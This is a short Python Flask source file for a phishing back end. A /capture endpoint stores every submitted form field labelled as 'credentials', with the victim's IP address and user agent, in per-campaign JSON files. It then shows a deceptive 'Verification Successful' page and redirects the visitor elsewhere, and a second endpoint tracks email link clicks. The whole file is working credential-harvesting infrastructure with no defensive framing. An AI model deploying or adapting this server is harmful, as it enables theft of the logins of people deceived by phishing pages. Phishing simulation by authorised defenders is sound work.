from flask import Flask, request, jsonify
import logging
from pathlib import Path
import json
from datetime import datetime

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration
CAPTURED_CREDS_DIR = Path("captured_credentials")
CAPTURED_CREDS_DIR.mkdir(exist_ok=True)

@app.route('/capture', methods=['POST'])
def capture_credentials():
    """Endpoint to capture submitted credentials"""
    try:
        data = request.form
        campaign = data.get('campaign', 'unknown')
        
        # Log the credentials
        creds_file = CAPTURED_CREDS_DIR / f"{campaign}_{datetime.now().strftime('%Y%m%d')}.json"
        
        entry = {
            'timestamp': datetime.now().isoformat(),
            'campaign': campaign,
            'ip_address': request.remote_addr,
            'user_agent': request.user_agent.string,
            'credentials': dict(data)
        }
        
        # Append to existing file or create new
        if creds_file.exists():
            with open(creds_file, 'r+') as f:
                existing = json.load(f)
                existing.append(entry)
                f.seek(0)
                json.dump(existing, f, indent=2)
        else:
            with open(creds_file, 'w') as f:
                json.dump([entry], f, indent=2)
        
        logger.info(f"Captured credentials for campaign: {campaign}")
        
        # Redirect to original site or show success message
        return """
        <html>
            <body>
                <h2>Verification Successful</h2>
                <p>Thank you for verifying your account.</p>
                <p>You will be redirected shortly...</p>
                <script>
                    setTimeout(() => window.location.href = "https://example.com", 3000);
                </script>
            </body>
        </html>
        """
        
    except Exception as e:
        logger.error(f"Failed to capture credentials: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/track/<campaign>', methods=['GET'])
def track_click(campaign):
    """Endpoint to track email link clicks"""
    try:
        logger.info(f"Click tracked for campaign: {campaign}")
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"Failed to track click: {e}")
        return jsonify({'status': 'error'}), 500

def run_server(host='0.0.0.0', port=5000):
    """Start the web server"""
    app.run(host=host, port=port)

if __name__ == '__main__':
    run_server()
